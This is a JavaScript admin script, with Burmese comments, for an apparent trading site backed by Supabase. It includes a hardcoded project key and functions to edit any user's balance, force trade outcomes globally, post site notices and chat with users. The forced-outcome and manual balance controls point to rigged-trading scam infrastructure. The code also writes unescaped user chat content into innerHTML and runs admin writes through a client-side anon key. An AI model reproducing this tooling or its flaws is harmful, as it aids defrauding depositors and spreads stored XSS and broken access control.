/* --- SGX MASTER ADMIN SCRIPT (UPDATED CREDENTIALS) --- */

// အသစ်ပေးလိုက်သော Supabase Credentials များ
const SUPABASE_URL = "https://labuecnbqufcljreilme.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxhYnVlY25icXVmY2xqcmVpbG1lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk4MTU3OTUsImV4cCI6MjA4NTM5MTc5NX0.U2IW5-pYLTlqpxC1ToktWedyxHuyHQB9YnLa4wsZDBE";

const { createClient } = supabase;
const db = createClient(SUPABASE_URL, SUPABASE_KEY);

let currentChatUID = null;
let adminSubscription = null;

// --- ၁။ UI & TAB CONTROL ---
function showTab(tabId) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    
    const targetTab = document.getElementById('tab-' + tabId);
    if(targetTab) targetTab.classList.add('active');
    
    if(event) event.currentTarget.classList.add('active');
    
    if(tabId === 'chat') refreshChatUsers();
}

// --- ၂။ USER & BALANCE CONTROL ---
async function checkUser() {
    const uid = document.getElementById('targetUID').value;
    if(!uid) return alert("Enter User UID");

    const { data } = await db.from('users').select('*').eq('id', uid).single();
    if(data) {
        alert(`User Found!\nName: ${data.content.username}\nBalance: $${data.content.balance}`);
    } else {
        alert("User Not Found");
    }
}

async function adjustBalance(type) {
    const uid = document.getElementById('targetUID').value;
    const amount = parseFloat(document.getElementById('balanceValue').value);
    if(!uid || isNaN(amount)) return alert("Fill UID and Amount");

    const { data } = await db.from('users').select('*').eq('id', uid).single();
    if(data) {
        let newBal = data.content.balance;
        newBal = (type === 'add') ? newBal + amount : newBal - amount;
        
        const { error } = await db.from('users').update({ 
            content: { ...data.content, balance: newBal } 
        }).eq('id', uid);

        if(!error) alert("Balance Updated: $" + newBal);
    }
}

// --- ၃။ TRADE & SITE CONFIGURATION ---
async function setTradeResult(mode) {
    const { error } = await db.from('global_settings')
        .update({ force_result: mode })
        .eq('id', 'main_config');

    if (!error) {
        document.getElementById('currentOutcome').innerText = "Status: Forced to " + mode;
        alert("Trade Mode set to: " + mode);
    }
}

async function updateSiteContent() {
    const notice = document.getElementById('siteNotice').value;
    const news = document.getElementById('newsTitle').value;

    const { error } = await db.from('global_settings')
        .update({ announce_text: notice, breaking_news: news })
        .eq('id', 'main_config');

    if(!error) alert("App UI Updated Successfully!");
}

// --- ၄။ REAL-TIME CHAT SYSTEM ---
function initAdminListener() {
    if (adminSubscription) db.removeChannel(adminSubscription);

    adminSubscription = db.channel('admin-global-channel')
        .on('postgres_changes', 
            { event: 'INSERT', schema: 'public', table: 'messages' }, 
            (payload) => {
                const newMsg = payload.new;
                refreshChatUsers();

                if (currentChatUID && currentChatUID == newMsg.uid) {
                    if (newMsg.is_admin === false) {
                         appendAdminMessageToUI(newMsg.content, false, newMsg.type);
                    }
                }
            }
        ).subscribe();
}

async function refreshChatUsers() {
    const { data } = await db.from('messages')
        .select('uid')
        .order('created_at', { ascending: false });

    if (data) {
        const uniqueUsers = [...new Set(data.map(m => m.uid))];
        const listContainer = document.getElementById('chat-user-list');
        if (listContainer) {
            listContainer.innerHTML = uniqueUsers.map(uid => `
                <div class="user-item ${currentChatUID === uid ? 'active' : ''}" onclick="selectUserChat('${uid}')">
                    <i class="fas fa-user-circle"></i> User ID: ${uid}
                </div>
            `).join('');
        }
    }
}

async function selectUserChat(uid) {
    currentChatUID = uid;
    document.getElementById('chat-header-info').innerText = "Chatting with: " + uid;

    const { data } = await db.from('messages')
        .select('*')
        .eq('uid', uid)
        .order('created_at', { ascending: true });

    const display = document.getElementById('admin-chat-display');
    if (display) {
        display.innerHTML = "";
        if (data) data.forEach(m => appendAdminMessageToUI(m.content, m.is_admin, m.type));
    }
}

async function sendAdminReply() {
    const input = document.getElementById('admin-reply-input');
    const text = input.value.trim();

    if (text !== "" && currentChatUID) {
        appendAdminMessageToUI(text, true, 'text'); 
        input.value = ""; 

        const { error } = await db.from('messages').insert([
            { uid: currentChatUID, content: text, type: 'text', is_admin: true }
        ]);
        if (error) alert("Error sending: " + error.message);
    }
}

function appendAdminMessageToUI(content, isAdmin, type = 'text') {
    const display = document.getElementById('admin-chat-display');
    if (!display) return;

    const msgDiv = document.createElement('div');
    msgDiv.className = `chat-msg ${isAdmin ? 'admin' : 'user'}`;
    
    if (type === 'image') {
        msgDiv.innerHTML = `<img src="${content}" style="max-width:200px; border-radius:10px;">`;
    } else {
        msgDiv.innerHTML = `<div class="msg-content">${content}</div>`;
    }
    
    display.appendChild(msgDiv);
    display.scrollTop = display.scrollHeight;
}

// --- ၅။ STARTUP ---
document.addEventListener('DOMContentLoaded', () => {
    initAdminListener();
    refreshChatUsers();
});